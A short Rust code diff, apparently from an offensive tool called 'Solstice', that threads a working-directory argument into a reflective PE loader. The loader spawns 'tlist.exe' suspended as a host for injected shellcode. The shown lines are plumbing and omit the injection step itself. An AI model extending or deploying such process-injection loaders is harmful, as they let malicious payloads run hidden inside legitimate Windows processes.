@@ -24,10 +24,10 @@ struct ShellcodeArgs {
 pub fn solstice_reflective_load_pe(
     path: &str,
     args: &[String],
-    _working_dir: &str,
+    working_dir: &str,
 ) -> Result<Child, Error> {
     info!(
-        "[Solstice] Reflective loading PE: {path} with args {args:?} in {_working_dir}"
+        "[Solstice] Reflective loading PE: {path} with args {args:?} in {working_dir}"
     );
 
     let mut path = String::from_str(path).unwrap();
@@ -40,7 +40,7 @@ pub fn solstice_reflective_load_pe(
     info!("Shellcode size: {shellcode_size} bytes");
 
     // Spawn the target process in suspended state (we don't want it's main thread to run)
-    let child = spawn_target_process()?;
+    let child = spawn_target_process(working_dir)?;
     let process_handle = HANDLE(child.as_raw_handle() as isize);
 
     info!("Target process spawned with handle: {process_handle:?}");
@@ -221,11 +221,12 @@ pub fn solstice_reflective_load_pe(
     Ok(child)
 }
 
-fn spawn_target_process() -> Result<Child, Error> {
+fn spawn_target_process(working_dir: &str) -> Result<Child, Error> {
     let process_name = "C:\\Windows\\System32\\tlist.exe";
 
     let mut cmd = Command::new(process_name);
     let child = cmd
+        .current_dir(working_dir)
         .creation_flags(CREATE_SUSPENDED.0)
         .stdin(Stdio::null())
         .stdout(Stdio::piped())
